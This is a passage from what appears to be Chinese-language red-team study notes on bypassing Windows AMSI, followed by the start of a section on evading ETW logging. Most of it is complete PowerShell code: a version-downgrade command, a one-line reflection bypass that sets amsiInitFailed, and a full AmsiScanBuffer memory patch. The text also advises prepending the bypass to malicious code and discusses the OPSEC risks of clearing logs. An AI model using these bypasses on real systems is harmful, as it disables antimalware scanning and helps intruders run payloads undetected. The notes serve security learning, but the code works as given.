AMSI"></a>绕过 AMSI</h2><h3 id="PowerShell-降级"><a href="#PowerShell-降级" class="headerlink" title="PowerShell 降级"></a>PowerShell 降级</h3><p>PowerShell 降级攻击是一个唾手可得的手段，允许攻击者修改当前的 PowerShell 版本以移除安全功能。</p><p>大多数 PowerShell 会话会启动最近的 PowerShell 引擎，但是攻击者能通过一行命令去修改他的版本。PowerShell 的安全特性是在 5.0 版本才实现的，所以可以绕过这些安全特性。</p><figure class="shiki power"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre><code># 通过 -Version 指定版本PowerShell -Version 2</code></pre></div></div></figure><p><a href="https://github.com/trustedsec/unicorn">Unicorn</a> 是利用这种攻击的一个例子，因为这种攻击门槛很低，可以通过移除 PowerShell 2.0 引擎和其他的方法去解决他。</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">full_attack = &#39;&#39;&#39;powershell /w 1 /C &quot;sv {0} -;</span></span><span class="line"><span style="color: #abb2bf">sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());</span></span><span class="line"><span style="color: #abb2bf">powershell (gv {5}).value.toString() (\\&#39;&#39;&#39;&#39;.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + &quot;)&quot; + &#39;&quot;&#39;</span></span></code></pre></div></div></figure><h3 id="PowerShell-反射"><a href="#PowerShell-反射" class="headerlink" title="PowerShell 反射"></a>PowerShell 反射</h3><p>反射允许用户或者管理员直接访问 .Net 程序集和交互，PowerShell 反射可被滥用来修改并识别有价值 DLL 中的信息。</p><p>PowerShell 的 AMSI 存储在位于 <code>System.Management.Automation.AmsiUtils</code> 的 <code>AMSIUtils</code> .NET 程序集中。</p><p>Matt Graeber 用一行命令就可以通过反射来修改并绕过 AMSI 。下面的代码块展示了这一行命令。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Ref</span><span style="color: #ABB2BF">].Assembly.GetType(</span><span style="color: #98C379">&#39;System.Management.Automation.AmsiUtils&#39;</span><span style="color: #ABB2BF">).GetField(</span><span style="color: #98C379">&#39;amsiInitFailed&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;NonPublic,Static&#39;</span><span style="color: #ABB2BF">).SetValue(</span><span style="color: #D19A66">$null</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">$true</span><span style="color: #ABB2BF">)</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 1.调用反射函数并指定它要使用来自 [Ref.Assembly] 的程序集，然后它将使用 GetType 获取类型</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Ref</span><span style="color: #ABB2BF">].Assembly.GetType(</span><span style="color: #98C379">&#39;System.Management.Automation.AmsiUtils&#39;</span><span style="color: #ABB2BF">)</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 2.从上一节收集的信息将被转发到下一个函数，以使用 GetField 在程序集内获取指定字段</span></span><span class="line"><span style="color: #ABB2BF">.GetField(</span><span style="color: #98C379">&#39;amsiInitFailed&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;NonPublic,Static&#39;</span><span style="color: #ABB2BF">)</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 3.然后程序集和字段信息将被转发到下一个参数，以使用 SetValue 将值从 $false 设置为 $true</span></span><span class="line"><span style="color: #ABB2BF">.SetValue(</span><span style="color: #D19A66">$null</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">$true</span><span style="color: #ABB2BF">)</span></span></code></pre></div></div></figure><p>一旦 <code>amsiInitFailed</code> 字段被设置为 <code>$true</code> ，AMSI 将返回响应代码：AMSI_RESULT_NOT_DETECTED &#x3D; 1</p><h3 id="修补-AMSI"><a href="#修补-AMSI" class="headerlink" title="修补 AMSI"></a>修补 AMSI</h3><p>AMSI 会插桩到 <code>System.Management.Automation.dll</code>（即 PowerShell 的核心）这里去调用 <code>amsi.dll</code>；但是这个 <code>dll</code> 可以被操纵，让他强制指向我们想要的一个响应代码。这个 DLL 里面有一个叫 <code>AmsiScanBuffer</code> 的函数，它会扫描一段疑似代码的 “buffer”，并将其报告给 <code>amsi.dll</code> 拿到结果。假设我们可以控制此函数并用一个干净的返回代码覆盖该缓冲区，是不是就能绕过了？</p><p><code>AmsiScanBuffer</code> 脆弱的原因是因为 <code>amsi.dll</code> 是加载到 PowerShell 进程的，但是我们的会话具有与该程序相同的权限级别。</p><p>我们将分析 BC-Security 受 Tal Liberman 启发而修改的代码片段；你可以在<a href="https://github.com/BC-SECURITY/Empire/blob/master/empire/server/common/bypasses.py">这里</a>找到原始代码。RastaMouse 也有一个用 C# 编写的类似旁路，使用了相同的技术；你可以在<a href="https://github.com/rasta-mouse/AmsiScanBufferBypass">这里</a>找到代码。</p><p>从宏观上看，AMSI 修补可以分为四个步骤：</p><ol><li>获取 amsi.dll 的句柄</li><li>获取 AmsiScanBuffer 的进程地址</li><li>修改 AmsiScanBuffer 的内存保护</li><li>向 AmsiScanBuffer 写入操作码</li></ol><p>我们首先需要加载要使用的外部库和 API，通过 <a href="p/invoke">p&#x2F;invoke</a> 从 kernel32 加载 <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress">GetProcAddress</a>、<a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea">GetModuleHandle</a> 和 <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect">VirtualProtect</a>。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">`&quot;</span><span style="color: #ABB2BF">kernel32</span><span style="color: #56B6C2">`&quot;</span><span style="color: #ABB2BF">)] </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 导入提供 API 的 DLL</span></span><span class="line"><span style="color: #ABB2BF">public </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> extern IntPtr GetProcAddress( </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 要导入的 API</span></span><span class="line"><span style="color: #ABB2BF">IntPtr hModule, </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> DLL 模块的句柄</span></span><span class="line"><span style="color: #ABB2BF">string procName </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 要获得的方法或者变量</span></span><span class="line"><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">`&quot;</span><span style="color: #ABB2BF">kernel32</span><span style="color: #56B6C2">`&quot;</span><span style="color: #ABB2BF">)]</span></span><span class="line"><span style="color: #ABB2BF">public </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> extern IntPtr GetModuleHandle(</span></span><span class="line"><span style="color: #ABB2BF">string lpModuleName </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 要获得模块的句柄</span></span><span class="line"><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">`&quot;</span><span style="color: #ABB2BF">kernel32</span><span style="color: #56B6C2">`&quot;</span><span style="color: #ABB2BF">)]</span></span><span class="line"><span style="color: #ABB2BF">public </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> extern bool VirtualProtect(</span></span><span class="line"><span style="color: #ABB2BF">IntPtr lpAddress, </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 修改内存区域的地址</span></span><span class="line"><span style="color: #ABB2BF">UIntPtr dwSize, </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 区域大小</span></span><span class="line"><span style="color: #ABB2BF">uint flNewProtect, </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 内存保护选项</span></span><span class="line"><span style="color: #ABB2BF">out uint lpflOldProtect </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 存储先前保护选项的指针</span></span><span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure><p>现在函数已被定义，但我们需要使用 <code>Add-Type</code> 来加载这些 API。此 cmdlet 会将这些函数以适当的类型和 namespace 加载，从而允许调用这些函数。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">$Kernel32</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">Add-Type</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">MemberDefinition </span><span style="color: #E06C75">$MethodDefinition</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Name </span><span style="color: #98C379">&#39;Kernel32&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">NameSpace </span><span style="color: #98C379">&#39;Win32&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">PassThru;</span></span></code></pre></div></div></figure><p>现在我们可以调用我们的 API 函数了，首先，我们需要使用 <code>GetModuleHandle</code> 来识别 AMSI 的进程句柄。然后将使用该句柄通过 <code>GetProcAddress</code> 来识别 <code>AmsiScanBuffer</code> 函数的内存地址。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">$handle</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">Win32.Kernel32</span><span style="color: #ABB2BF">]::GetModuleHandle(</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #98C379">&#39;amsi.dll&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 获取 amsi.dll 的句柄</span></span><span class="line"><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">IntPtr</span><span style="color: #ABB2BF">]</span><span style="color: #E06C75">$BufferAddress</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">Win32.Kernel32</span><span style="color: #ABB2BF">]::GetProcAddress(</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$handle</span><span style="color: #ABB2BF">, </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> amsi.dll 的句柄</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #98C379">&#39;AmsiScanBuffer&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 函数的名称</span></span><span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure><p>接下来，我们需要修改 <code>AmsiScanBuffer</code> 函数区域的内存保护。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]</span><span style="color: #E06C75">$Size</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0x5</span><span style="color: #ABB2BF">; </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 区域大小</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]</span><span style="color: #E06C75">$ProtectFlag</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0x40</span><span style="color: #ABB2BF">; </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 保护参数 PAGE_EXECUTE_READWRITE 读写权限</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]</span><span style="color: #E06C75">$OldProtectFlag</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">; </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 存储老的保护参数 这里是占位符</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Win32.Kernel32</span><span style="color: #ABB2BF">]::VirtualProtect(</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$BufferAddress</span><span style="color: #ABB2BF">, </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> AmsiScanBuffer 的内存地址</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$Size</span><span style="color: #ABB2BF">, </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 区域大小</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$ProtectFlag</span><span style="color: #ABB2BF">, </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 对该区域开启读写权限</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Ref</span><span style="color: #ABB2BF">]</span><span style="color: #E06C75">$OldProtectFlag</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 存储先前保护选项的指针</span></span><span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure><p>我们需要指定要用什么覆盖该缓冲区；识别该缓冲区的过程可以<a href="https://rastamouse.me/memory-patching-amsi-bypass/">在此处</a>找到。一旦指定了缓冲区，就可以使用 <a href="https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.copy?view=net-6.0">marshal copy</a> 将数据写入该进程。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">$buf</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">Byte</span><span style="color: #ABB2BF">[]]([</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]</span><span style="color: #D19A66">0xB8</span><span style="color: #ABB2BF">,[</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]</span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, [</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]</span><span style="color: #D19A66">0x00</span><span style="color: #ABB2BF">, [</span><span style="color: #C678DD">Uint32</span><span style="color: #ABB2BF">]</span><span style="color: #D19A66">0x07</span><span style="color: #ABB2BF">, [</span><span style="color: #C678DD">Uint32</span><span style="color: #ABB2BF">]</span><span style="color: #D19A66">0x80</span><span style="color: #ABB2BF">, [</span><span style="color: #C678DD">Uint32</span><span style="color: #ABB2BF">]</span><span style="color: #D19A66">0xC3</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">system.runtime.interopservices.marshal</span><span style="color: #ABB2BF">]::copy(</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$buf</span><span style="color: #ABB2BF">, </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 要写入的 Opcodes</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">array</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 偏移量</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$BufferAddress</span><span style="color: #ABB2BF">, </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 写入位置</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #D19A66">6</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 写入大小</span></span><span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure><p>最终代码如下：</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">$MethodDefinition</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;</span></span><span class="line"></span><span class="line"><span style="color: #98C379">    [DllImport(</span><span style="color: #56B6C2">`&quot;</span><span style="color: #98C379">kernel32</span><span style="color: #56B6C2">`&quot;</span><span style="color: #98C379">)]</span></span><span class="line"><span style="color: #98C379">    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);</span></span><span class="line"></span><span class="line"><span style="color: #98C379">    [DllImport(</span><span style="color: #56B6C2">`&quot;</span><span style="color: #98C379">kernel32</span><span style="color: #56B6C2">`&quot;</span><span style="color: #98C379">)]</span></span><span class="line"><span style="color: #98C379">    public static extern IntPtr GetModuleHandle(string lpModuleName);</span></span><span class="line"></span><span class="line"><span style="color: #98C379">    [DllImport(</span><span style="color: #56B6C2">`&quot;</span><span style="color: #98C379">kernel32</span><span style="color: #56B6C2">`&quot;</span><span style="color: #98C379">)]</span></span><span class="line"><span style="color: #98C379">    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);</span></span><span class="line"><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">$Kernel32</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">Add-Type</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">MemberDefinition </span><span style="color: #E06C75">$MethodDefinition</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Name </span><span style="color: #98C379">&#39;Kernel32&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">NameSpace </span><span style="color: #98C379">&#39;Win32&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">PassThru;</span></span><span class="line"><span style="color: #E06C75">$handle</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">Win32.Kernel32</span><span style="color: #ABB2BF">]::GetModuleHandle(</span><span style="color: #98C379">&#39;amsi.dll&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">IntPtr</span><span style="color: #ABB2BF">]</span><span style="color: #E06C75">$BufferAddress</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">Win32.Kernel32</span><span style="color: #ABB2BF">]::GetProcAddress(</span><span style="color: #E06C75">$handle</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;AmsiScanBuffer&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]</span><span style="color: #E06C75">$Size</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0x5</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]</span><span style="color: #E06C75">$ProtectFlag</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0x40</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]</span><span style="color: #E06C75">$OldProtectFlag</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Win32.Kernel32</span><span style="color: #ABB2BF">]::VirtualProtect(</span><span style="color: #E06C75">$BufferAddress</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$Size</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$ProtectFlag</span><span style="color: #ABB2BF">, [</span><span style="color: #C678DD">Ref</span><span style="color: #ABB2BF">]</span><span style="color: #E06C75">$OldProtectFlag</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">$buf</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">Byte</span><span style="color: #ABB2BF">[]]([</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]</span><span style="color: #D19A66">0xB8</span><span style="color: #ABB2BF">,[</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]</span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, [</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]</span><span style="color: #D19A66">0x00</span><span style="color: #ABB2BF">, [</span><span style="color: #C678DD">Uint32</span><span style="color: #ABB2BF">]</span><span style="color: #D19A66">0x07</span><span style="color: #ABB2BF">, [</span><span style="color: #C678DD">Uint32</span><span style="color: #ABB2BF">]</span><span style="color: #D19A66">0x80</span><span style="color: #ABB2BF">, [</span><span style="color: #C678DD">Uint32</span><span style="color: #ABB2BF">]</span><span style="color: #D19A66">0xC3</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">system.runtime.interopservices.marshal</span><span style="color: #ABB2BF">]::copy(</span><span style="color: #E06C75">$buf</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$BufferAddress</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">6</span><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure><p>现在 AMSI 已经被绕过了，但是他只在这个 PowerShell 会话中有效，原因前面说了，DLL 是加载到 PowerShell 进程里面的。</p><h3 id="自动化工具"><a href="#自动化工具" class="headerlink" title="自动化工具"></a>自动化工具</h3><h4 id="amsi-fail"><a href="#amsi-fail" class="headerlink" title="amsi.fail"></a>amsi.fail</h4><p><a href="http://amsi.fail/">amsi.fail</a> 可以从一个已知的绕过方式库里面编译并且生成一个 PowerShell 绕过脚本。</p><p>AMSI.fail 生成混淆的 PowerShell 片段，用于破坏或禁用当前进程的 AMSI。这些片段在混淆前会从一个小的技术&#x2F;变体池中随机选择。每个片段在运行时&#x2F;请求时都会被混淆，因此没有任何生成的输出会共享相同的特征签名。</p><p>把此绕过代码附加在恶意代码的开头，或者在执行恶意代码之前在同一会话中运行它。</p><h4 id="AMSITrigger-1"><a href="#AMSITrigger-1" class="headerlink" title="AMSITrigger"></a>AMSITrigger</h4><p>之前说过可以用 <a href="https://github.com/RythmStick/AMSITrigger">AMSITrigger</a> 去检测我们的代码片段是否有会被检测的特征，这种绕过 AMSI 的方法比其他方法更稳定，因为你是在使文件本身变得“干净”。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.freebuf.com/articles/system/263966.html">反恶意软件扫描接口（AMSI）对抗学习</a></p><h1 id="Evading-Logging-and-Monitoring"><a href="#Evading-Logging-and-Monitoring" class="headerlink" title="Evading Logging and Monitoring"></a>Evading Logging and Monitoring</h1><p>这个房间是讲留痕的问题，主要内容就是绕过 Windows 的那个日志记录，让影响最小化。</p><p>监控一般是从主机开始的，收集应用程序或者事件日志，日志一旦生成，可以保存在设备上或者发送到事件收集器&#x2F;采集器。一旦日志被从设备上取走，攻击者可能无法进行太多控制，但可以控制设备上的内容以及这些内容如何被采集。攻击者的主要目标是控制 ETW (<strong>E</strong>vent <strong>T</strong>racing for <strong>W</strong>indows)。</p><h2 id="事件跟踪"><a href="#事件跟踪" class="headerlink" title="事件跟踪"></a>事件跟踪</h2><p>Windows 中几乎所有的事件记录功能在应用程序和内核层面都是由 ETW 处理的。虽然还有其他服务存在，比如事件记录（Event Logging）和跟踪记录（Trace Logging），但这些要么是 ETW 的扩展，要么对攻击者来说不那么常见。</p><table><thead><tr><th><strong>组件</strong></th><th><strong>目的</strong></th></tr></thead><tbody><tr><td>控制器</td><td>构建并配置会话</td></tr><tr><td>提供者</td><td>产生事件</td></tr><tr><td>消费者</td><td>解释事件</td></tr></tbody></table><p>因为 ETW 可以被检测者查看到，所以在渗透的过程中要始终注意可能产生的事件。对 ETW 采取的最佳办法是尽量减少对我们具体行为的记录，同时在不破坏环境完整性的前提下实施。</p><h2 id="日志规避的方法"><a href="#日志规避的方法" class="headerlink" title="日志规避的方法"></a>日志规避的方法</h2><p>删日志并不是一个好办法，在安全的最佳实践中，典型的现代环境中会有一个叫日志转发的机制。日志转发意味着 SOC 会将主机上的日志移动或“转发”到集中服务器。即使攻击者能够从主机上删除日志，这些日志也可能已经离开设备并被保护起来。</p><p>如果日志在转发前就已经全部被删除，或者这些日志根本没有被转发，那会不会引起警报？首先应该考虑到环境完整性，如果这个设备没有任何日志产生，那么就会引起严重怀疑。</p><table><thead><tr><th><strong>Event ID</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>1102</td><td>记录何时清除了 Windows 安全审计日志</td></tr><tr><td>104</td><td>记录何时清除了日志文件</td></tr><tr><td>1100</td><td>记录了 Windows 事件日志服务被关闭时的事件</td></tr></tbody></table><p>上述事件 ID 可用于监控销毁日志或“日志破坏”的过程。这对试图篡改或销毁日志的攻击者构成了明显风险。尽管仍有可能进一步绕过这些缓解措施或篡改日志，但攻击者必须评估风险。在接触一个环境时，你通常不了解其安全措施，并且通过尝试这种方法会承担 OPSEC（Operational Security）风险。</p><h2 id="事件跟踪实现"><a href="#事件跟踪实现" class="headerlink" title="事件跟踪实现"></a>事件跟踪实现</h2><p>Event Tracking for Windows（ETW）是一种强大的系统日志记录机制，它由三个相互独立的组件协同工作，共同管理和关联数据流。</p><ul><li><strong>事件提供程序 (Event Provider)<strong>： <strong>功能：</strong> 这是事件的</strong>源头</strong>，负责<strong>生成</strong>事件。 <strong>工作原理：</strong> 提供程序是包含事件跟踪代码的应用程序。它会根据事件控制器的指令来决定是否生成事件。当被控制器启用后，提供程序就会从其指定的来源收集并发送日志。</li><li><strong>事件控制器 (Event Controller)<strong>： <strong>功能：</strong> 这是一个</strong>指挥中心</strong>，用于<strong>管理</strong>和<strong>配置</strong>事件会话。 <strong>工作原理：</strong> 控制器决定了数据如何被收集以及流向何处。它定义了日志文件的大小、位置，启动或停止跟踪会话，启用或禁用特定的提供程序，并管理缓冲区。简而言之，控制器负责整个数据流的<strong>指挥调度</strong>。</li><li><strong>事件消费者 (Event Consumer)<strong>： <strong>功能：</strong> 这是一个</strong>分析工具</strong>，用于<strong>接收</strong>和<strong>解释</strong>事件。 <strong>工作原理：</strong> 